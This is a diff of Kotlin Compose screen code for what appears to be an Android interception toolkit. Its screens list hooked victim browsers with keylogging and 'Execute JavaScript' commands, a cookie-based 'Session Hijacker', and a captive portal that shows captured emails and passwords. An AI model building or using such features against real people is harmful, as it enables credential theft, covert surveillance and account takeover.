+                        Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(CgAmber.copy(0.1f)),
+                            contentAlignment = Alignment.Center) {
+                            Icon(Icons.Filled.PhoneAndroid, contentDescription = null, tint = CgAmber, modifier = Modifier.size(18.dp))
+                        }
+                        Spacer(Modifier.width(10.dp))
+                        Column(Modifier.weight(1f)) {
+                            Text(host.hostname ?: host.ip, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.Medium)
+                            if (host.hostname != null) Text(host.ip, fontSize = 10.sp, color = CgGray)
+                            host.mac?.let { Text(it, fontSize = 9.sp, color = CgGray.copy(0.6f)) }
+                        }
+                        Column(horizontalAlignment = Alignment.End) {
+                            host.vendor?.let {
+                                Badge(containerColor = CgCyan.copy(0.12f)) {
+                                    Text(it.take(10), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp))
+                                }
+                            }
+                            Spacer(Modifier.height(4.dp))
+                            Text("needs proxy", fontSize = 8.sp, color = CgAmber)
+                        }
+                    }
+                }
+            }
+        }
     }
 }
 
@@ -587,8 +698,11 @@ fun DeviceCard(device: ConnectedDevice, onSetNickname: (String, String) -> Unit)
         Column(Modifier.padding(14.dp)) {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
-                    Box(Modifier.size(42.dp).clip(RoundedCornerShape(10.dp)).background(if (device.isHooked) CgMagenta.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
-                        Icon(Icons.Filled.PhoneAndroid, contentDescription = null, tint = if (device.isHooked) CgMagenta else CgCyan, modifier = Modifier.size(20.dp))
+                    Box(Modifier.size(42.dp).clip(RoundedCornerShape(10.dp))
+                        .background(if (device.isHooked) CgMagenta.copy(0.15f) else CgGreen.copy(0.1f)),
+                        contentAlignment = Alignment.Center) {
+                        Icon(Icons.Filled.PhoneAndroid, contentDescription = null,
+                            tint = if (device.isHooked) CgMagenta else CgGreen, modifier = Modifier.size(20.dp))
                     }
                     Spacer(Modifier.width(12.dp))
                     Column {
@@ -598,7 +712,12 @@ fun DeviceCard(device: ConnectedDevice, onSetNickname: (String, String) -> Unit)
                     }
                 }
                 Column(horizontalAlignment = Alignment.End) {
-                    if (device.isHooked) Badge(containerColor = CgMagenta) { Text("HOOKED", fontSize = 8.sp, color = CgBg, modifier = Modifier.padding(horizontal = 4.dp)) }
+                    if (device.isHooked) Badge(containerColor = CgMagenta) {
+                        Text("HOOKED", fontSize = 8.sp, color = CgBg, modifier = Modifier.padding(horizontal = 4.dp))
+                    }
+                    Badge(containerColor = CgGreen.copy(0.2f)) {
+                        Text("PROXIED", fontSize = 8.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp))
+                    }
                     Spacer(Modifier.height(4.dp))
                     IconButton(onClick = { showNickname = !showNickname }, modifier = Modifier.size(24.dp)) {
                         Icon(Icons.Filled.Edit, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
@@ -609,7 +728,6 @@ fun DeviceCard(device: ConnectedDevice, onSetNickname: (String, String) -> Unit)
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(16.dp)) {
                 Text("Reqs: ${device.requestCount}", fontSize = 10.sp, color = CgGray)
                 Text("Traffic: ${formatBytes(device.bytesTransferred)}", fontSize = 10.sp, color = CgGray)
-                Text("First: ${device.firstSeen.toString().take(16)}", fontSize = 10.sp, color = CgGray)
             }
             if (showNickname) {
                 Spacer(Modifier.height(8.dp))
@@ -618,10 +736,12 @@ fun DeviceCard(device: ConnectedDevice, onSetNickname: (String, String) -> Unit)
                         placeholder = { Text("Set nickname...", fontSize = 11.sp) },
                         textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite),
                         modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
-                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
+                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg,
+                            focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                     Spacer(Modifier.width(6.dp))
                     FilledIconButton(onClick = { onSetNickname(device.ip, nickname.text); showNickname = false },
-                        colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)), modifier = Modifier.size(42.dp)) {
+                        colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)),
+                        modifier = Modifier.size(42.dp)) {
                         Icon(Icons.Filled.Check, contentDescription = null, tint = CgGreen, modifier = Modifier.size(18.dp))
                     }
                 }
@@ -640,22 +760,31 @@ fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand
     LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
         item { Text("Hooked Browsers", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
         item { Text("${sessions.count { it.isAlive }} live sessions", fontSize = 12.sp, color = CgGray) }
+        if (sessions.isEmpty()) {
+            item { EmptyState(Icons.Filled.Phishing, "No hooked sessions", "Hook agent injects when target visits an HTTP page via your proxy") }
+        }
         items(sessions.filter { it.isAlive }) { session ->
             val isSelected = selectedSession == session.sessionId
             Card(Modifier.fillMaxWidth().clickable { selectedSession = if (isSelected) null else session.sessionId },
                 colors = CardDefaults.cardColors(containerColor = if (isSelected) CgMagenta.copy(0.08f) else CgCard),
-                shape = RoundedCornerShape(12.dp), border = if (isSelected) BorderStroke(1.dp, CgMagenta.copy(0.4f)) else null) {
+                shape = RoundedCornerShape(12.dp),
+                border = if (isSelected) BorderStroke(1.dp, CgMagenta.copy(0.4f)) else null) {
                 Column(Modifier.padding(14.dp)) {
                     Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                         Column(Modifier.weight(1f)) {
-                            Text(session.pageUrl.take(48), fontSize = 12.sp, color = CgCyan, fontWeight = FontWeight.SemiBold, maxLines = 1, overflow = TextOverflow.Ellipsis)
-                            Text("${session.platform} · ${session.screenSize} · keys:${session.keylog.size}", fontSize = 10.sp, color = CgGray)
+                            Text(session.pageUrl.take(48), fontSize = 12.sp, color = CgCyan,
+                                fontWeight = FontWeight.SemiBold, maxLines = 1, overflow = TextOverflow.Ellipsis)
+                            Text("${session.platform} · ${session.screenSize} · keys:${session.keylog.size}",
+                                fontSize = 10.sp, color = CgGray)
                         }
-                        Badge(containerColor = CgGreen.copy(0.2f)) { Text("LIVE", fontSize = 8.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp)) }
+                        Badge(containerColor = CgGreen.copy(0.2f)) {
+                            Text("LIVE", fontSize = 8.sp, color = CgGreen, modifier = Modifier.padding(horizontal = 4.dp))
+                        }
                     }
                     if (isSelected) {
                         Spacer(Modifier.height(10.dp))
-                        FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
+                        FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp),
+                            verticalArrangement = Arrangement.spacedBy(6.dp)) {
                             CmdChip("Screenshot", CgCyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
                             CmdChip("Keylog ON", CgMagenta) { onCommand(session.sessionId, "keylog_start", emptyMap()) }
                             CmdChip("Keylog OFF", CgGray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
@@ -673,10 +802,13 @@ fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand
                                 placeholder = { Text("Execute JavaScript...", fontSize = 11.sp) },
                                 textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgGreen, fontFamily = FontFamily.Monospace),
                                 modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
-                                colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
+                                colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg,
+                                    focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                             Spacer(Modifier.width(6.dp))
-                            FilledIconButton(onClick = { onCommand(session.sessionId, "exec_js", mapOf("code" to jsInput.text)); jsInput = TextFieldValue("") },
-                                colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)), modifier = Modifier.size(42.dp)) {
+                            FilledIconButton(
+                                onClick = { onCommand(session.sessionId, "exec_js", mapOf("code" to jsInput.text)); jsInput = TextFieldValue("") },
+                                colors = IconButtonDefaults.filledIconButtonColors(containerColor = CgGreen.copy(0.2f)),
+                                modifier = Modifier.size(42.dp)) {
                                 Icon(Icons.Filled.PlayArrow, contentDescription = null, tint = CgGreen, modifier = Modifier.size(18.dp))
                             }
                         }
@@ -695,7 +827,8 @@ fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand
 @Composable
 fun CmdChip(label: String, color: Color, onClick: () -> Unit) {
     SuggestionChip(onClick = onClick, label = { Text(label, fontSize = 10.sp, color = color) },
-        shape = RoundedCornerShape(8.dp), border = SuggestionChipDefaults.suggestionChipBorder(enabled = true, borderColor = color.copy(0.3f)),
+        shape = RoundedCornerShape(8.dp),
+        border = SuggestionChipDefaults.suggestionChipBorder(enabled = true, borderColor = color.copy(0.3f)),
         colors = SuggestionChipDefaults.suggestionChipColors(containerColor = color.copy(0.08f)))
 }
 
@@ -711,8 +844,9 @@ fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -
                     Text("Network Map", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                     Text("${hosts.size} hosts discovered", fontSize = 12.sp, color = CgGray)
                 }
-                Button(onClick = onScan, enabled = !isScanning, colors = ButtonDefaults.buttonColors(containerColor = CgCyan.copy(0.15f)), shape = RoundedCornerShape(10.dp),
-                    border = BorderStroke(1.dp, CgCyan.copy(0.4f))) {
+                Button(onClick = onScan, enabled = !isScanning,
+                    colors = ButtonDefaults.buttonColors(containerColor = CgCyan.copy(0.15f)),
+                    shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgCyan.copy(0.4f))) {
                     if (isScanning) CircularProgressIndicator(modifier = Modifier.size(14.dp), color = CgCyan, strokeWidth = 2.dp)
                     else Icon(Icons.Filled.Radar, contentDescription = null, tint = CgCyan, modifier = Modifier.size(14.dp))
                     Spacer(Modifier.width(6.dp))
@@ -723,17 +857,23 @@ fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -
         items(hosts) { host ->
             Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
                 Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
-                    Box(Modifier.size(38.dp).clip(RoundedCornerShape(8.dp)).background(if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
+                    Box(Modifier.size(38.dp).clip(RoundedCornerShape(8.dp))
+                        .background(if (host.isGateway) CgGreen.copy(0.15f) else CgCyan.copy(0.1f)),
+                        contentAlignment = Alignment.Center) {
                         Icon(if (host.isGateway) Icons.Filled.Router else Icons.Filled.PhoneAndroid,
                             contentDescription = null, tint = if (host.isGateway) CgGreen else CgCyan, modifier = Modifier.size(18.dp))
                     }
                     Spacer(Modifier.width(12.dp))
                     Column(Modifier.weight(1f)) {
                         Text(host.hostname ?: host.ip, fontSize = 13.sp, fontWeight = FontWeight.Medium, color = CgWhite)
-                        Text(if (host.hostname != null) host.ip else "", fontSize = 10.sp, color = CgGray)
+                        if (host.hostname != null) Text(host.ip, fontSize = 10.sp, color = CgGray)
                         host.mac?.let { Text(it, fontSize = 10.sp, color = CgGray.copy(0.6f)) }
                     }
-                    host.vendor?.let { Badge(containerColor = CgCyan.copy(0.12f)) { Text(it.take(12), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp)) } }
+                    host.vendor?.let {
+                        Badge(containerColor = CgCyan.copy(0.12f)) {
+                            Text(it.take(12), fontSize = 8.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 4.dp))
+                        }
+                    }
                 }
             }
         }
@@ -741,7 +881,7 @@ fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -
 }
 
 // ============================
-// STATS SCREEN
+// STATS
 // ============================
 @Composable
 fun StatsScreen(stats: TrafficStats) {
@@ -768,7 +908,7 @@ fun StatsScreen(stats: TrafficStats) {
                         }
                     }
                     Spacer(Modifier.height(4.dp))
-                    Text("Peak: ${formatBytes(bwHistory.maxOfOrNull { it.bytesPerSecond } ?: 0)}/s · Current: ${formatBytes(bwHistory.lastOrNull()?.bytesPerSecond ?: 0)}/s", fontSize = 10.sp, color = CgCyan)
+                    Text("Current: ${formatBytes(bwHistory.lastOrNull()?.bytesPerSecond ?: 0)}/s", fontSize = 10.sp, color = CgCyan)
                 }
             }
         }
@@ -788,7 +928,7 @@ fun StatsScreen(stats: TrafficStats) {
 }
 
 // ============================
-// SESSION HIJACKER
+// HIJACK
 // ============================
 @Composable
 fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Unit, onRemove: (String) -> Unit) {
@@ -796,22 +936,24 @@ fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Uni
         item {
             Text("Session Hijacker", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
             Spacer(Modifier.height(4.dp))
-            Text("Tap a session to open it authenticated in your browser. Sessions are auto-added from captured cookies.", fontSize = 12.sp, color = CgGray, lineHeight = 16.sp)
+            Text("Sessions auto-added from captured cookies. Tap Hijack to open authenticated.", fontSize = 12.sp, color = CgGray, lineHeight = 16.sp)
         }
         if (sessions.isEmpty()) {
             item { EmptyState(Icons.Filled.Lock, "No sessions available", "Capture cookie sessions from targets to hijack them") }
         } else {
             items(sessions) { session ->
-                Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgRed.copy(0.2f))) {
+                Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard),
+                    shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgRed.copy(0.2f))) {
                     Column(Modifier.padding(14.dp)) {
                         Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                             Column(Modifier.weight(1f)) {
                                 Text(session.label, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                                 Text("From: ${session.sourceIp}", fontSize = 11.sp, color = CgGray)
-                                Text(session.capturedAt.toString().take(16), fontSize = 10.sp, color = CgGray.copy(0.6f))
                             }
                             Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
-                                FilledTonalButton(onClick = { onHijack(session) }, colors = ButtonDefaults.filledTonalButtonColors(containerColor = CgRed.copy(0.2f)), shape = RoundedCornerShape(8.dp)) {
+                                FilledTonalButton(onClick = { onHijack(session) },
+                                    colors = ButtonDefaults.filledTonalButtonColors(containerColor = CgRed.copy(0.2f)),
+                                    shape = RoundedCornerShape(8.dp)) {
                                     Icon(Icons.Filled.OpenInBrowser, contentDescription = null, tint = CgRed, modifier = Modifier.size(14.dp))
                                     Spacer(Modifier.width(4.dp))
                                     Text("Hijack", color = CgRed, fontSize = 11.sp)
@@ -822,7 +964,8 @@ fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Uni
                             }
                         }
                         Spacer(Modifier.height(6.dp))
-                        Text(session.cookies.take(80) + if (session.cookies.length > 80) "…" else "", fontSize = 9.sp, color = CgGray.copy(0.6f), fontFamily = FontFamily.Monospace, maxLines = 2)
+                        Text(session.cookies.take(80) + if (session.cookies.length > 80) "…" else "",
+                            fontSize = 9.sp, color = CgGray.copy(0.6f), fontFamily = FontFamily.Monospace, maxLines = 2)
                     }
                 }
             }
@@ -831,24 +974,32 @@ fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Uni
 }
 
 // ============================
-// CAPTIVE PORTAL SCREEN
+// CAPTIVE PORTAL
 // ============================
 @Composable
 fun CaptiveScreen(config: CaptiveConfig, entries: List<CaptiveEntry>, onUpdateConfig: (CaptiveConfig) -> Unit) {
     var activeTab by remember { mutableStateOf(0) }
     Column(Modifier.fillMaxSize()) {
-        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp),
+            horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
             Text("Captive Portal", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
             Badge(containerColor = if (config.enabled) CgGreen.copy(0.2f) else CgGray.copy(0.2f)) {
-                Text(if (config.enabled) "ACTIVE" else "OFF", fontSize = 9.sp, color = if (config.enabled) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
+                Text(if (config.enabled) "ACTIVE" else "OFF", fontSize = 9.sp,
+                    color = if (config.enabled) CgGreen else CgGray,
+                    modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
             }
         }
         TabRow(selectedTabIndex = activeTab, containerColor = CgSurface, contentColor = CgGreen) {
-            Tab(selected = activeTab == 0, onClick = { activeTab = 0 }) { Text("Config", fontSize = 12.sp, modifier = Modifier.padding(vertical = 10.dp)) }
+            Tab(selected = activeTab == 0, onClick = { activeTab = 0 }) {
+                Text("Config", fontSize = 12.sp, modifier = Modifier.padding(vertical = 10.dp))
+            }
             Tab(selected = activeTab == 1, onClick = { activeTab = 1 }) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
                     Text("Captures", fontSize = 12.sp, modifier = Modifier.padding(vertical = 10.dp))
-                    if (entries.isNotEmpty()) { Spacer(Modifier.width(4.dp)); Badge(containerColor = CgRed) { Text("${entries.size}", fontSize = 8.sp) } }
+                    if (entries.isNotEmpty()) {
+                        Spacer(Modifier.width(4.dp))
+                        Badge(containerColor = CgRed) { Text("${entries.size}", fontSize = 8.sp) }
+                    }
                 }
             }
         }
@@ -876,10 +1027,12 @@ fun CaptiveConfigTab(config: CaptiveConfig, onUpdate: (CaptiveConfig) -> Unit) {
 @Composable
 fun CaptiveField(label: String, value: String, onChange: (String) -> Unit) {
     var text by remember { mutableStateOf(TextFieldValue(value)) }
-    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) }, label = { Text(label, fontSize = 10.sp) },
-        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite), modifier = Modifier.fillMaxWidth(),
-        singleLine = true, shape = RoundedCornerShape(8.dp),
-        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgCard, focusedContainerColor = CgCard, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgAmber))
+    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) },
+        label = { Text(label, fontSize = 10.sp) },
+        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
+        modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
+        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgCard, focusedContainerColor = CgCard,
+            unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgAmber))
 }
 
 @Composable
@@ -895,12 +1048,14 @@ fun CaptiveCapturesTab(entries: List<CaptiveEntry>) {
                     Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                         Text(entry.sourceIp, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.Medium)
                         Badge(containerColor = if (entry.accepted) CgGreen.copy(0.2f) else CgGray.copy(0.2f)) {
-                            Text(if (entry.accepted) "SUBMITTED" else "VISITED", fontSize = 8.sp, color = if (entry.accepted) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 4.dp))
+                            Text(if (entry.accepted) "SUBMITTED" else "VISITED", fontSize = 8.sp,
+                                color = if (entry.accepted) CgGreen else CgGray, modifier = Modifier.padding(horizontal = 4.dp))
                         }
                     }
                     entry.username?.let { Text("Email/User: $it", fontSize = 11.sp, color = CgCyan, modifier = Modifier.padding(top = 4.dp)) }
                     entry.password?.let { Text("Password: $it", fontSize = 11.sp, color = CgRed) }
-                    Text(entry.userAgent.take(55), fontSize = 9.sp, color = CgGray.copy(0.6f), maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.padding(top = 2.dp))
+                    Text(entry.userAgent.take(55), fontSize = 9.sp, color = CgGray.copy(0.6f),
+                        maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.padding(top = 2.dp))
                 }
             }
         }
@@ -908,12 +1063,13 @@ fun CaptiveCapturesTab(entries: List<CaptiveEntry>) {
 }
 
 // ============================
-// WEBSOCKET SCREEN
+// WEBSOCKET
 // ============================
 @Composable
 fun WebSocketScreen(frames: List<WebSocketFrame>) {
     Column(Modifier.fillMaxSize()) {
-        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp),
+            horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
             Text("WebSocket Frames", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
             Text("${frames.size} captured", fontSize = 12.sp, color = CgGray)
         }
@@ -937,7 +1093,8 @@ fun WebSocketScreen(frames: List<WebSocketFrame>) {
                             }
                             if (frame.payload.isNotEmpty()) {
                                 Spacer(Modifier.height(4.dp))
-                                Text(frame.payload.take(120), fontSize = 10.sp, color = CgWhite.copy(0.7f), fontFamily = FontFamily.Monospace, maxLines = 3, overflow = TextOverflow.Ellipsis)
+                                Text(frame.payload.take(120), fontSize = 10.sp, color = CgWhite.copy(0.7f),
+                                    fontFamily = FontFamily.Monospace, maxLines = 3, overflow = TextOverflow.Ellipsis)
                             }
                         }
                     }
@@ -948,31 +1105,32 @@ fun WebSocketScreen(frames: List<WebSocketFrame>) {
 }
 
 // ============================
-// SETTINGS SCREEN
+// SETTINGS
 // ============================
 @Composable
 fun SettingsScreen(
     mode: InterceptMode, onModeChange: (InterceptMode) -> Unit,
     config: InjectionConfig, onConfigUpdate: (InjectionConfig) -> Unit,
-    profiles: List<String>, onSaveProfile: (String) -> Unit, onLoadProfile: (String) -> Unit, onDeleteProfile: (String) -> Unit,
+    profiles: List<String>, onSaveProfile: (String) -> Unit,
+    onLoadProfile: (String) -> Unit, onDeleteProfile: (String) -> Unit,
     onExportCa: () -> Unit, savedSessions: List<String>,
-    onSaveSession: () -> Unit, onDeleteSession: (String) -> Unit, onShareSession: (String) -> Unit,
-    autoStart: Boolean, onToggleAutoStart: (Boolean) -> Unit,
-    gatewayIp: String = "192.168.43.1",
-    navigateTo: (Screen) -> Unit
+    onSaveSession: () -> Unit, onDeleteSession: (String) -> Unit,
+    onShareSession: (String) -> Unit, autoStart: Boolean,
+    onToggleAutoStart: (Boolean) -> Unit, navigateTo: (Screen) -> Unit
 ) {
     var profileName by remember { mutableStateOf(TextFieldValue("")) }
     LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
         item { Text("Settings", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite) }
 
-        // intercept mode
         item {
             CgCard {
                 Text("Intercept Mode", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                 Spacer(Modifier.height(8.dp))
                 InterceptMode.entries.forEach { m ->
-                    Row(Modifier.fillMaxWidth().clickable { onModeChange(m) }.padding(vertical = 6.dp), verticalAlignment = Alignment.CenterVertically) {
-                        RadioButton(selected = mode == m, onClick = { onModeChange(m) }, colors = RadioButtonDefaults.colors(selectedColor = CgGreen))
+                    Row(Modifier.fillMaxWidth().clickable { onModeChange(m) }.padding(vertical = 6.dp),
+                        verticalAlignment = Alignment.CenterVertically) {
+                        RadioButton(selected = mode == m, onClick = { onModeChange(m) },
+                            colors = RadioButtonDefaults.colors(selectedColor = CgGreen))
                         Spacer(Modifier.width(8.dp))
                         Column {
                             Text(m.name, fontSize = 12.sp, color = CgWhite, fontWeight = FontWeight.Medium)
@@ -987,7 +1145,6 @@ fun SettingsScreen(
             }
         }
 
-        // injection config
         item {
             CgCard {
                 Text("Injection Config", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
@@ -1002,7 +1159,6 @@ fun SettingsScreen(
             }
         }
 
-        // profiles
         item {
             CgCard {
                 Text("Injection Profiles", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
@@ -1012,16 +1168,19 @@ fun SettingsScreen(
                         placeholder = { Text("Profile name", fontSize = 11.sp) },
                         textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite),
                         modifier = Modifier.weight(1f).height(42.dp), singleLine = true, shape = RoundedCornerShape(8.dp),
-                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
+                        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg,
+                            unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
                     Spacer(Modifier.width(6.dp))
                     Button(onClick = { if (profileName.text.isNotBlank()) { onSaveProfile(profileName.text); profileName = TextFieldValue("") } },
-                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(8.dp), contentPadding = PaddingValues(horizontal = 14.dp)) {
+                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)),
+                        shape = RoundedCornerShape(8.dp), contentPadding = PaddingValues(horizontal = 14.dp)) {
                         Text("Save", fontSize = 11.sp, color = CgGreen)
                     }
                 }
                 Spacer(Modifier.height(6.dp))
                 profiles.forEach { name ->
-                    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+                    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp),
+                        horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                         Text(name, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
                         Row {
                             TextButton(onClick = { onLoadProfile(name) }) { Text("Load", fontSize = 10.sp, color = CgCyan) }
@@ -1032,12 +1191,12 @@ fun SettingsScreen(
             }
         }
 
-        // session snapshots
         item {
             CgCard {
                 Text("Session Snapshots", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
                 Spacer(Modifier.height(8.dp))
-                Button(onClick = onSaveSession, colors = ButtonDefaults.buttonColors(containerColor = CgBlue.copy(0.2f)), shape = RoundedCornerShape(8.dp), modifier = Modifier.fillMaxWidth(),
+                Button(onClick = onSaveSession, colors = ButtonDefaults.buttonColors(containerColor = CgBlue.copy(0.2f)),
+                    shape = RoundedCornerShape(8.dp), modifier = Modifier.fillMaxWidth(),
                     border = BorderStroke(1.dp, CgBlue.copy(0.4f))) {
                     Icon(Icons.Filled.Save, contentDescription = null, tint = CgBlue, modifier = Modifier.size(16.dp))
                     Spacer(Modifier.width(6.dp))
@@ -1060,7 +1219,6 @@ fun SettingsScreen(
             }
         }
 
-        // system
         item {
             CgCard {
                 Text("System", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgAmber)
@@ -1068,6 +1226,7 @@ fun SettingsScreen(
                 ToggleRow("Auto-start on boot", autoStart, onToggleAutoStart)
                 HorizontalDivider(color = CgGray.copy(0.15f), modifier = Modifier.padding(vertical = 4.dp))
                 SettingsRow("Export CA Certificate", Icons.Filled.Security, CgAmber, onExportCa)
+                SettingsRow("QR Setup / Proxy Config", Icons.Filled.QrCode, CgGreen) { navigateTo(Screen.SETUP) }
                 SettingsRow("Network Map", Icons.Filled.Radar, CgCyan) { navigateTo(Screen.NETWORK) }
                 SettingsRow("Captive Portal", Icons.Filled.Wifi, CgAmber) { navigateTo(Screen.CAPTIVE) }
                 SettingsRow("WebSocket Frames", Icons.Filled.Cable, CgPurple) { navigateTo(Screen.WEBSOCKET) }
@@ -1082,23 +1241,28 @@ fun SettingsScreen(
 @Composable
 fun SettingsField(label: String, value: String, onChange: (String) -> Unit) {
     var text by remember { mutableStateOf(TextFieldValue(value)) }
-    OutlinedTextField(value = text, onValueChange = { text = it; onChange(it.text) }, label = { Text(label, fontSize = 10.sp) },
-        textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite), modifier = Modifier.fillMaxWidth().padding(top = 4.dp),
-        singleLine = true, shape = RoundedCornerShape(8.dp),
-        colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen))
